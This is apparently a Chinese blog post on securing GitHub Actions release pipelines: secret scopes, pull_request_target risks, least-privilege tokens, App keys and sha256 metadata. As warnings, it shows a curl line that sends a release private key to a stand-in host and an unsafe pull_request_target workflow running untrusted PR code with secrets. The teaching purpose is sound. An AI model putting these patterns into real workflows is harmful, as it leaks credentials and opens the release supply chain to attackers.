---
title: "GitHub 安全机制解析（三）：Actions、Release 与自动发布流水线的安全边界"
date: 2026-06-30 10:23:13
tags:
  - "GitHub"
  - "GitHub Actions"
  - "release"
  - "supply chain"
categories:
  - "Tooling"
---

## 〇、前言

前两篇分别讲了 GitHub 权限分层和几种 token 的身份模型。

这一篇把它们落到一个完整的自动发布场景里：

```text
example-org/web-client
→ GitHub Actions 构建资源
→ 发布到 example-org/resource-assets
→ 用户或程序下载 release asset
```

这条链路看起来只是一个普通 CI/CD：

```text
push main，然后自动发 release
```

但从安全角度看，它其实是一条供应链。因为用户最后下载的东西，不一定是源码本身，而是 release asset。只要有人能影响这个 asset，他就可能影响所有下载它的人。

所以这一篇不只讲怎么跑通，而是讲怎么把边界想清楚：

- 谁能改 workflow？
- secret 放在哪里？
- PR 会不会拿到 secret？
- `GITHUB_TOKEN` 权限有没有收紧？
- GitHub App private key 谁能读？
- 谁能触发发布？
- release asset 有没有 sha256？
- `latest` 被覆盖有没有风险？
- `main` 分支有没有保护？

还是继续使用虚构仓库：

| 名称 | 类型 | 作用 |
|------|------|------|
| `example-org/web-client` | 源仓库 | 构建资源，运行 Actions |
| `example-org/resource-assets` | 目标仓库 | 存放公开 release asset |
| `example-resource-release-bot` | GitHub App | 负责写入 `resource-assets` |

## 一、先画出发布链路

我们先把目标流程画出来：

![GitHub Actions 发布流水线安全边界](/images/mermaid-svg/github-security-model-part-3/release-pipeline-security-boundary.svg)

从安全角度看，每一个箭头都可能成为边界。

比如：

- 如果 `main` 不保护，那么任何能 push 的人都能触发发布；
- 如果 workflow 可以随便改，那么能改 workflow 的人就可能读取 secret；
- 如果 private key 泄露，别人就能代表 App 发 token；
- 如果 release asset 没有 hash，下载端就很难判断文件是否正确；
- 如果 `latest` 可以覆盖，那么发布权限就非常敏感。

自动化不是越自动越安全。自动化只是把人的操作变成了代码操作。代码操作如果没有边界，风险反而更集中。

## 二、Workflow 是代码，而且是高权限代码

很多时候我们会下意识把 `.github/workflows/*.yml` 当成配置文件。但在安全上，它应该被当成代码，而且是可能接触密钥、发布产物、部署系统的高权限代码。

假设 `example-org/web-client` 里有这个 workflow：

```yaml
name: Publish resource assets

on:
  push:
    branches:
      - main

permissions:
  contents: read

jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Build resource pack
        run: ./scripts/build-resource-pack.sh

      - name: Create GitHub App token
        id: app-token
        uses: actions/create-github-app-token@v3
        with:
          app-id: ${{ secrets.RELEASE_APP_ID }}
          private-key: ${{ secrets.RELEASE_APP_PRIVATE_KEY }}
          owner: example-org
          repositories: resource-assets

      - name: Publish release asset
        env:
          GH_TOKEN: ${{ steps.app-token.outputs.token }}
        run: |
          gh release upload latest dist/resource-pack.zip \
            --repo example-org/resource-assets \
            --clobber
```

这个文件不是普通配置。谁能改它，谁就可能改变发布逻辑。

比如恶意修改可以做这些事情：

```yaml
- name: Bad step
  run: |
    curl -X POST https://example.invalid/collect \
      -d "$RELEASE_APP_PRIVATE_KEY"
```

GitHub 会对 secret 做 masking，但 masking 不是安全边界。真正的边界是：

> 不让不可信代码在能读 secret 的上下文里执行。

所以 workflow 修改必须 review，尤其是能读取 secret、发布 release、部署服务的 workflow。

## 三、Secrets 的作用域

GitHub secrets 常见作用域有三类：

| 类型 | 作用范围 | 适合放什么 |
|------|----------|------------|
| repository secrets | 单个仓库 | 只给这个仓库用的凭证 |
| environment secrets | 指定 environment | 需要人工审批或环境隔离的凭证 |
| organization secrets | 多个仓库共享 | 多仓库通用凭证，但要严格限制可见仓库 |

对于我们的例子，可能会有：

```text
RELEASE_APP_ID
RELEASE_APP_PRIVATE_KEY
```

如果只有 `web-client` 需要发布资源，那么直接放在 `web-client` 的 repository secrets 中最简单。

如果多个源仓库都需要发布资源，比如：

```text
example-org/web-client
example-org/backend-service
example-org/docs-site
```

那么可以考虑 organization secrets，但必须限制可见仓库，只允许这些可信源仓库读取。

千万不要把发布 App 的 private key 开放给整个组织所有仓库。因为只要某个仓库的 workflow 能读到它，就可能代表 App 请求 installation token。

一个更稳的模型是：

```text
Secret 可见范围:
  只给可信源仓库

App 安装范围:
  只安装到 resource-assets

App 权限:
  Contents write + Metadata read
```

这样即使源仓库数量增加，边界仍然清楚。

## 四、PR 安全：pull_request 和 pull_request_target 不是一回事

GitHub Actions 里有两个非常容易混淆的事件：

```yaml
on: pull_request
```

和：

```yaml
on: pull_request_target
```

普通的 `pull_request` 通常更安全。尤其是来自 fork 的 PR，GitHub 默认不会把敏感 secrets 暴露给它。

而 `pull_request_target` 的危险在于，它运行在目标仓库上下文，可能能拿到更高权限和 secrets。如果你在 `pull_request_target` 里 checkout 并执行外部 PR 的代码，就很危险。

危险模式类似这样：

```yaml
on: pull_request_target

jobs:
  unsafe:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}

      - run: ./scripts/test.sh
        env:
          SECRET: ${{ secrets.SUPER_SECRET }}
```

这相当于：

```text
拿着目标仓库的 secret
去运行外部贡献者提交的代码
```

这就不是测试了，这是把门打开了。

对于发布 workflow，建议：

- 不在 PR 事件里发布；
- 不在 fork PR 中暴露发布 secret；
- 发布只允许 `push main` 或手动审批后的 environment；
- 对 `pull_request_target` 保持极高警惕；
- 需要评论 PR 或打 label 时，尽量不要 checkout 并执行外部代码。

## 五、permissions 最小化

GitHub Actions 的 `permissions` 用来控制 `GITHUB_TOKEN` 的权限。

即使 workflow 里主要使用 GitHub App token，也应该把默认 `GITHUB_TOKEN` 收紧。

比如普通构建：

```yaml
permissions:
  contents: read
```

需要写当前仓库 release 时才给：

```yaml
permissions:
  contents: write
```

需要评论 PR 才给：

```yaml
permissions:
  pull-requests: write
```

我们的跨仓库发布流程里，比较推荐：

```yaml
permissions:
  contents: read
```

然后发布 `resource-assets` 时使用 GitHub App token：

```yaml
- name: Create GitHub App token
  id: app-token
  uses: actions/create-github-app-token@v3
  with:
    app-id: ${{ secrets.RELEASE_APP_ID }}
    private-key: ${{ secrets.RELEASE_APP_PRIVATE_KEY }}
    owner: example-org
    repositories: resource-assets
```

这样两个权限边界是分开的：

```text
GITHUB_TOKEN:
  只读 web-client

GitHub App token:
  只写 resource-assets
```

不要为了省事给 `GITHUB_TOKEN` 开很大权限，也不要把一个高权限 PAT 塞进所有 job。

## 六、Release asset 是供应链入口

Release asset 和源码不一样。

源码通常有人 review，有 commit history，有 PR 记录。但是用户下载 release asset 时，很多时候只看到一个压缩包：

```text
resource-pack.zip
```

用户并不会重新构建它，也不会逐行检查里面是什么。程序自动更新资源时更是如此，下载、解压、使用，整个过程可能都没有人眼参与。

所以 release asset 是供应链入口。

在 `example-org/resource-assets` 里，如果 `latest` release 总是保存最新资源：

```text
https://github.com/example-org/resource-assets/releases/download/latest/resource-pack.zip
```

那谁能覆盖这个 asset，谁就能影响所有下载 latest 的用户。

这不是说 `latest` 不能用。`latest` 很方便，尤其适合资源管理器自动拉取最新资源。但它必须配套更严格的发布权限。

## 七、metadata 和 sha256 的意义

发布资源时，最好同时发布一个 metadata 文件。

例如：

```json
{
  "source_repo": "example-org/web-client",
  "source_commit": "abc1234def5678",
  "release_repo": "example-org/resource-assets",
  "asset_name": "resource-pack.zip",
  "size": 1048576,
  "sha256": "b5c1fb2efc6d6b4674c2fdcc48ce01b43a3b7c03763c0c3355de0099ee0f8c73"
}
```

下载端，比如一个 Resource Manager，可以这样做：

```text
下载 metadata.json
→ 读取 resource-pack.zip 的 sha256
→ 下载 resource-pack.zip
→ 本地计算 sha256
→ 两者一致才使用
```

这能防什么？

- 下载中断；
- CDN 或网络返回了错误文件；
- 本地缓存错乱；
- 用户拿到了不完整压缩包；
- 版本和 metadata 对不上。

但它不能防什么？

> 它不能防止有发布权限的人恶意发布。

如果攻击者已经拿到了发布权限，他可以同时上传恶意 zip 和对应 sha256。下载端校验仍然会通过。

所以 hash 是完整性校验，不是发布者可信证明。

想继续增强，可以加：

- release 签名；
- build provenance；
- SLSA；
- artifact attestation；
- tag protection；
- environment approval。

先把 sha256 做起来，是一个很好的基础，但不要误以为它解决了全部供应链安全问题。

## 八、一个稍完整的发布 workflow

下面是一个示例 workflow。它做几件事情：

- 只在 `main` push 时发布；
- 默认 `GITHUB_TOKEN` 只有 read；
- 构建资源包；
- 计算 sha256 和 size；
- 生成 metadata；
- 使用 GitHub App token 发布到 `resource-assets`；
- 覆盖 `latest` release 中的 asset。

```yaml
name: Publish resource assets

on:
  push:
    branches:
      - main
  workflow_dispatch:

permissions:
  contents: read

jobs:
  publish:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Build resource pack
        run: |
          mkdir -p dist
          ./scripts/build-resource-pack.sh dist/resource-pack.zip

      - name: Generate metadata
        run: |
          size=$(stat -c%s dist/resource-pack.zip)
          sha256=$(sha256sum dist/resource-pack.zip | awk '{print $1}')

          cat > dist/metadata.json <<EOF
          {
            "source_repo": "${GITHUB_REPOSITORY}",
            "source_commit": "${GITHUB_SHA}",
            "asset_name": "resource-pack.zip",
            "size": ${size},
            "sha256": "${sha256}"
          }
          EOF

      - name: Create GitHub App token
        id: app-token
        uses: actions/create-github-app-token@v3
        with:
          app-id: ${{ secrets.RELEASE_APP_ID }}
          private-key: ${{ secrets.RELEASE_APP_PRIVATE_KEY }}
          owner: example-org
          repositories: resource-assets

      - name: Publish assets
        env:
          GH_TOKEN: ${{ steps.app-token.outputs.token }}
        run: |
          gh release view latest --repo example-org/resource-assets || \
            gh release create latest \
              --repo example-org/resource-assets \
              --title "Latest resource assets" \
              --notes "Automatically generated from ${GITHUB_REPOSITORY}@${GITHUB_SHA}"

          gh release upload latest \
            dist/resource-pack.zip \
            dist/metadata.json \
            --repo example-org/resource-assets \
            --clobber
```

这不是唯一写法，但它体现了几个关键原则：

- 当前仓库 token 权限收紧；
- 跨仓库写入使用 App token；
- 发布内容带 metadata；
- source commit 可追溯；
- 自动发布集中到 `main` 或手动触发。

## 九、main 分支保护就是发布保护

如果发布 workflow 由 `push main` 触发，那么保护 `main` 就是在保护发布流水线。

对 `example-org/web-client`，建议至少开启：

- 禁止 direct push；
- 要求 PR review；
- 要求 status checks；
- 要求 branch up to date；
- 限制 force push；
- 限制删除分支；
- 对 workflow 文件修改要求 code owner review。

比如可以用 `CODEOWNERS`：

```text
.github/workflows/ @example-org/security-team
scripts/build-resource-pack.sh @example-org/release-team
```

这样修改 workflow 或构建脚本时，必须由对应负责人 review。

这一点很重要。因为只保护 `.github/workflows` 不一定够，构建脚本也可能影响发布产物。

比如 workflow 里执行：

```bash
./scripts/build-resource-pack.sh
```

那么能改这个脚本的人，也能影响最终 release asset。

所以发布链路上所有关键文件都应该纳入 review：

- workflow；
- build script；
- release script；
- metadata generator；
- dependency lock file；
- 下载端校验逻辑。

## 十、Rulesets：比传统 branch protection 更统一

传统 branch protection 通常按仓库、按分支配置。仓库多了以后，容易出现不一致。

Rulesets 更适合组织级治理。比如 `example-org` 可以统一规定：

```text
所有仓库的 main 分支：
  - 禁止 force push
  - 禁止删除
  - 必须 PR
  - 必须 status checks

发布相关仓库：
  - 修改 .github/workflows 需要 review
  - 修改 release 脚本需要 review
```

如果 `example-org` 有多个源仓库：

```text
web-client
backend-service
docs-site
```

都可以通过统一 ruleset 让发布流程有一致底线。

这比每个仓库单独点页面更可靠。

## 十一、GitHub App private key 的治理

GitHub App private key 是整个模型里最敏感的东西之一。

它不是普通配置，而是能生成 App 身份凭证的根材料。谁拿到 private key，谁就可能请求 installation token。

不过 installation token 的影响范围仍然受 App 安装范围和权限限制。所以 App 本身要设计得很窄。

推荐模型：

```text
App: example-resource-release-bot
安装仓库:
  - example-org/resource-assets

权限:
  - Metadata: read
  - Contents: read and write

不授予:
  - Issues
  - Pull requests
  - Administration
  - Members
  - Secrets
  - Actions
```

private key 放置建议：

- 只放在可信源仓库；
- 优先使用 repository secrets 或受限 organization secrets；
- 不给普通 PR 暴露；
- 不在日志中打印；
- 不写入构建产物；
- 定期轮换；
- 离职、权限变更、安全事件后立即轮换。

这里有一个很好的安全直觉：

> private key 的可见范围，应该比 App 的安装范围更小。

App 安装到 `resource-assets` 是为了发布资源；private key 不应该被组织里所有仓库都能读取。

## 十二、GitHub 内置安全能力

GitHub 本身也提供了一些安全能力，应该尽量打开。

### Secret scanning

Secret scanning 可以检测 token、private key 等敏感信息是否被提交到仓库。

如果有人误把：

```text
-----BEGIN RSA PRIVATE KEY-----
...
-----END RSA PRIVATE KEY-----
```

提交到了仓库，它有机会被检测出来。

### Push protection

Push protection 更进一步，在 secret 被 push 前就阻止。

这比事后发现要好很多。

### Dependabot

Dependabot 可以提醒依赖漏洞，也可以自动提 PR 升级依赖。

对于发布流水线来说，构建工具和 action 依赖同样是供应链的一部分。

### Code scanning

Code scanning 可以做静态分析，发现常见安全问题。

### Audit log

Audit log 用来追踪组织里的关键事件，例如：

- 谁创建或删除了 token；
- 谁安装了 GitHub App；
- 谁修改了仓库权限；
- 谁改了 branch protection；
- 谁触发了 workflow；
- 谁发布了 release；
- 谁修改了 organization secret。

出了问题以后，audit log 是非常重要的时间线。

## 十三、示例项目安全基线

最后整理一份适合 `example-org` 的安全基线。

`resource-assets`：

- 保持 public，只放可公开下载资源；
- 不放源代码机密；
- release asset 配套 metadata；
- metadata 记录 source repo、commit、size、sha256；
- `latest` 可以覆盖，但发布权限必须严格控制。

`example-resource-release-bot`：

- 只安装到 `resource-assets`；
- 只给 Metadata read；
- 只给 Contents read/write；
- 不给 Administration、Secrets、Members 等权限；
- 定期轮换 private key。

`web-client`：

- 只在 `main` push 或手动审批后发布；
- `main` 开启保护；
- workflow 修改必须 review；
- 构建脚本修改必须 review；
- `GITHUB_TOKEN` 默认只给 `contents: read`；
- 跨仓库发布使用 GitHub App token；
- 不使用长期 PAT 做发布。

下载端：

- 下载 metadata；
- 校验 size；
- 校验 sha256；
- 校验失败不能继续使用；
- 记录使用的 source commit，方便回溯。

组织层：

- 开启 secret scanning；
- 开启 push protection；
- 开启 Dependabot；
- 开启 code scanning；
- 使用 rulesets 统一保护关键分支；
- 定期检查 audit log；
- 定期清理不再需要的 secrets、App、token。

## 十四、结论

GitHub Actions 自动发布不是简单的“写一个 workflow 然后上传文件”。只要 release asset 会被用户或程序下载，它就是供应链的一部分。

在这个模型里，最关键的安全问题是边界：

```text
谁能改 main？
谁能改 workflow？
谁能读 secret？
谁能生成 App token？
谁能写 release？
下载端如何确认文件没错？
```

比较稳的做法是：当前仓库的 `GITHUB_TOKEN` 只保留最小权限；跨仓库发布用 GitHub App；App 只安装到目标发布仓库；release asset 配套 metadata 和 sha256；`main`、workflow、构建脚本都纳入 review 和 rulesets。

这样做不是为了把流程搞复杂，而是为了让每个权限都有清楚的边界。自动化越长期、越靠近发布入口，就越应该这样做。

## 参考资料

- GitHub Actions 安全加固：[Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- `GITHUB_TOKEN` 权限：[Automatic token authentication](https://docs.github.com/actions/reference/authentication-in-a-workflow)
- OIDC：[OpenID Connect](https://docs.github.com/en/actions/concepts/security/openid-connect)
- GitHub 安全功能：[GitHub security features](https://docs.github.com/en/code-security/getting-started/github-security-features)
- GitHub rulesets：[About rulesets](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-rulesets/about-rulesets)
- GitHub protected branches：[About protected branches](https://docs.github.com/repositories/configuring-branches-and-merges-in-your-repository/managing-protected-branches/about-protected-branches)
- GitHub App 权限：[Choosing permissions for a GitHub App](https://docs.github.com/en/apps/creating-github-apps/registering-a-github-app/choosing-permissions-for-a-github-app)
